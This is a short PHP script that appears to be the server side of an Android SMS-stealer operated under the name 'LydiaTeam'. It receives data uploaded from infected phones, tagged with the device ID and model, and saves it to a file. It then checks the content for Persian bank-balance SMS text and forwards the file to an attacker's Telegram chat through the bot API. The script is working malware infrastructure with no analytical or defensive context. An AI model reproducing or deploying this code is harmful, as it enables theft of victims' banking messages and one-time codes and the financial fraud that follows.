<?php 
include "info.php";


if(isset($_GET['response'])){


 $result=$_GET['response'];
  
 if($result == "true"){
 if(isset($_GET['id'])){
 $androidid = $_GET['id'];
 }if(isset($_GET['model'])){
 $model=$_GET['model']; 
 }


if($result =="true"){





$PostData = file_get_contents("php://input");



$File = fopen("LydiaTeam.txt","w");



fwrite($File, $PostData); 



fclose($File);

$check = file_get_contents("LydiaTeam.txt");
if (strpos($check,"موجودی") !== false){
  $ramz = "ꜱᴍꜱ ꜰɪʟᴇ - ʙᴀɴᴋ ꜱᴍꜱ ᴅᴇᴛᴇᴄᴛᴇᴅ ✅";
}else{
  $ramz = "ʙᴀɴᴋ ꜱᴍꜱ Not Detected ❌";
}

$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.telegram.org/bot'.$token.'/sendDocument?chat_id='.$group1,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => array('document'=> new CURLFILE('LydiaTeam.txt'),"caption"=>"

~📱Android_Id : $androidid
~📡Smart_Phone : $model 
~🪓Panel : /set_$androidid
$ramz
~@LydiaTeam
")
));

$response = curl_exec($curl);

curl_close($curl);



}}}


?>